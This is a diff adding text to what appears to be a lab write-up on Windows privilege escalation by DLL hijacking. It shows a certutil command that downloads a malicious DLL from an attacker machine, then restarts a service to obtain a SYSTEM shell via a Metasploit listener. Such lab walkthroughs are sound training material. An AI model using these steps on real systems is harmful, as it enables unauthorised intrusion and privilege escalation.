@@ -267,9 +267,14 @@ run
 
 ### Downloaded the Malicious DLL on the Victim Machine
 
+After starting the Metasploit listener, I downloaded the malicious DLL from my Kali machine to the victim using certutil.
+First, I changed to the Temp directory.
+
 ```bash
 C:\PrivEsc> cd C:\Temp
 ```
+Then I downloaded the DLL.
+
 ```bash
 C:\Temp> certutil -urlcache -split -f http://192.168.5.128/hijackme.dll hijackme.dll
 ```
@@ -279,6 +284,32 @@ C:\Temp> certutil -urlcache -split -f http://192.168.5.128/hijackme.dll hijackme
   2400
 CertUtil: -URLCache command completed successfully.
 ```
+The download completed successfully, and the malicious DLL was saved as hijackme.dll on the victim machine.
+
 <p align="center">
   <img src="images/step4-3.png" width="600">
 </p>
+
+## Step 5 — Restarting the Service and Getting a SYSTEM Shell
+
+### Stopped the Service
+```bash
+C:\Temp> net stop dllsvc
+```
+**Output:**
+
+```
+The DLL Hijack Service service was stopped successfully.
+```
+
+### Started the Service Again
+
+```bash
+net start dllsvc
+```
+**Output:**
+
+```
+The DLL Hijack Service service is starting.
+The DLL Hijack Service service was started successfully.
+```
